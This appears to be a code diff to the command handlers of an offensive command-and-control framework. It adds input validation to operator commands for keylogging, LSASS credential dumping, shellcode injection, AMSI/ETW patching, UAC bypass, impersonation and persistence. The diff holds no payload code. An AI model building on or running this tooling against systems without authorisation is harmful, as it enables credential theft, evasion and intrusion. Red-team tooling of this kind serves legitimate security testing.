@@ -149,7 +149,7 @@ def handler_upload(path, is_recurse, command_dict):
     elif is_recurse == "0":
         command_dict["rec"] = False
     else:
-        utils.log_message("Use R or 0 (for recurse flag)", print_time=False)
+        utils.log_message("[-] Use R or 0 (for recurse flag)", print_time=False)
         return False
     return command_dict
 
@@ -168,7 +168,7 @@ def handler_upload(path, mode, content, command_dict):
     elif mode == "A":
         command_dict["append"] = True
     else:
-        utils.log_message("Use W or A (for write or append)", print_time=False)
+        utils.log_message("[-] Use W or A (for write or append)", print_time=False)
         return False
     return command_dict 
 
@@ -209,12 +209,17 @@ def handler_regwritekey(reg_key, command_dict):
     command_dict["key"] = reg_key
     return command_dict
 
-@register_command("regwritevalue", "Write registry value (supports string or dword)", "Registry Stuff", "Windows", ["<key-path>", "<value>", "<data>", "<d|s>"])
+@register_command("regwritevalue", "Write registry value (supports string or dword)", "Registry Stuff", "Windows", ["<key-path>", "<value>", "<data>", "<D|S>"])
 def handler_regwritevalue(reg_key, value, data, type, command_dict):
     command_dict["key"] = reg_key
     command_dict["value"] = value
-    if type == "d":
+    if type == "D":
         data = int(data)
+    elif type == "S":
+        pass
+    else:
+        utils.log_message("[-] Use D or S (for dword or string)", print_time=False)
+        return False
     command_dict["data"] = data
     command_dict["type"] = type
     return command_dict
@@ -253,16 +258,26 @@ def handler_screenshot(command_dict):
 
 @register_command("audio", "Record audio", "Collection Stuff", "Windows", ["<record-time>"])
 def handler_audio(seconds, command_dict):
-    command_dict["time"] = seconds
+    try:
+        command_dict["time"] = int(seconds)
+    except ValueError:
+        utils.log_message("[-] Record time should be int", print_time=False)
+        return False
     return command_dict
 
 @register_command("keylog", "Start/dump/stop keylogger", "Collection Stuff", "Windows", ["<start|dump|stop>"])
 def handler_keylog(subcommand, command_dict):
+    if subcommand not in ["start", "dump", "stop"]:
+        utils.log_message("[-] Not a valid keylog subcommand", print_time=False)
+        return False
     command_dict["subcommand"] = subcommand
     return command_dict
 
 @register_command("lsass", "Lsass operations (examine or dump)", "Post Exploitation Stuff", "Windows", ["<examine|direct|comsvcs|eviltwin>"], True)
 def handler_lsass(subcommand, command_dict):
+    if subcommand not in ["examine", "direct", "comsvcs", "eviltwin"]:
+        utils.log_message("[-] Not a valid lsass subcommand", print_time=False)
+        return False
     command_dict["subcommand"] = subcommand
     return command_dict
 
@@ -274,16 +289,22 @@ def handler_samdump(command_dict):
 def handler_shellc(shellcode_path, pid, command_dict):
     shellc_file_content = utils.read_file(shellcode_path)
     if not shellc_file_content:
+        utils.log_message("[-] Not a valid shellcode file", print_time=False)
         return False
     shellc_base64 = utils.encode_base_64(shellc_file_content, encoding="utf-8")
     command_dict["sh_b64"] = shellc_base64
-    command_dict["pid"] = int(pid)
+    try:
+        command_dict["pid"] = int(pid)
+    except ValueError:
+        utils.log_message("[-] Not a valid pid", print_time=False)
+        return False
     return command_dict
 
 @register_command("assembly", "Execute inline .NET assembly", "Post Exploitation Stuff", "Windows", ["<assembly-file>", "<args>"])
 def handler_assembly(assembly_path, args, command_dict):
     assembly_file_content = utils.read_file(assembly_path)
     if not assembly_file_content:
+        utils.log_message("[-] Not a valid assembly file", print_time=False)
         return False
     assembly_base64 = utils.encode_base_64(assembly_file_content)
     command_dict["as_b64"] = assembly_base64
@@ -292,6 +313,9 @@ def handler_assembly(assembly_path, args, command_dict):
 
 @register_command("patch", "Patch AMSI/ETW", "Evasion Stuff", "Windows", ["<amsi|etw>"])
 def handler_patch(target, command_dict):
+    if target not in ["amsi", "etw"]:
+        utils.log_message("[-] Not a valid patch target", print_time=False)
+        return False
     command_dict["func"] = target
     return command_dict
 
@@ -309,6 +333,9 @@ def handler_persist(command, process_name, command_dict):
 
 @register_command("uac", "UAC bypass", "Privesc Stuff", "Windows", ["<fodhelper|sdclt>", "<command>"])
 def handler_uac(method, command, command_dict):
+    if method not in ["fodhelper", "sdclt"]:
+        utils.log_message("[-] Not a uac method", print_time=False)
+        return False
     command_dict["method"] = method
     command_dict["cmd"] = command
     return command_dict
@@ -319,7 +346,11 @@ def handler_getsys(command_dict):
 
 @register_command("impersonate", "Impersonate another user", "Privesc Stuff", "Windows")
 def handler_impersonate(pid, command_dict):
-    command_dict["pid"] = int(pid)
+    try:
+        command_dict["pid"] = int(pid)
+    except ValueError:
+        utils.log_message("[-] Not a valid pid", print_time=False)
+        return False
     return command_dict
 
 @register_command("rev2self", "Revert to self", "Privesc Stuff", "Windows")
@@ -339,13 +370,20 @@ def handler_speak(text, command_dict):
 
 @register_command("critical", "Set process critical (BSOD on termination)", "Misc Stuff", "Windows", ["<true/false>"], True)
 def handler_critical(critical_flag, command_dict):
+    if critical_flag not in ["true", "false"]:
+        utils.log_message("[-] Critical flag should be true or false", print_time=False)
+        return False
     command_dict["is_critical"] = critical_flag
     return command_dict
 
 @register_command("sleep", "Change sleep time interval and jitter", "Communication Stuff", "All", ["<sleep-time>", "<jitter-%>"])
 def handler_sleep(sleep_time, jitter, command_dict):
-    command_dict["sleep"] = int(sleep_time)
-    command_dict["jitter"] = int(jitter)
+    try:
+        command_dict["sleep"] = int(sleep_time)
+        command_dict["jitter"] = int(jitter)
+    except ValueError:
+        utils.log_message("[-] Arguments sleep and jitter should be ints", print_time=False)
+        return False
     return command_dict
 
 @register_command("collect", "Recollect agent data", "Communication Stuff", "All")
@@ -360,6 +398,7 @@ def handler_die(command_dict):
 def handler_memfd(mode, elf_path, commandline, command_dict):
     elf_file_content = utils.read_file(elf_path)
     if not elf_file_content:
+        utils.log_message("[-] Not a valid ELF file", print_time=False)
         return False
     elf_base64 = utils.encode_base_64(elf_file_content, encoding="utf-8")
     command_dict["elf_b64"] = elf_base64
@@ -586,8 +625,6 @@ def agent_screen(agent_id, os):
             command = command_registry.get(command_type)
             if command:
                 command_dict = command.handler(*command_list[1:])
-                if command_dict:
-                    listener.agents[agent_id]["pending_commands"] += [command_dict]
                 if command_dict:
                     listener.agents[agent_id]["pending_commands"] += [command_dict]
             else:
